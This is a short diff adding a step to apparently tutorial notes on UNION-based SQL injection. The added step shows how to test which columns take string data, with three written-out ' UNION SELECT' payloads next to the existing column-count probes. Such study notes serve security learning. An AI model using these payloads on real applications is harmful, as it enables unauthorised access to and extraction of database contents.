@@ -23,3 +23,14 @@ If you get an error, then that is not the correct number of columns. Keep adding
 >
 >' UNION SELECT NULL,NULL,NULL--
 >etc.
+
+
+Once you've determined the number of columns, you can probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn.
+
+Just replace each NULL with any string e.g If the number of columns is three:
+
+>' UNION SELECT 'abc',NULL,NULL--
+>
+>' UNION SELECT NULL,'abc',NULL--
+>
+>' UNION SELECT NULL,NULL,'abc'--
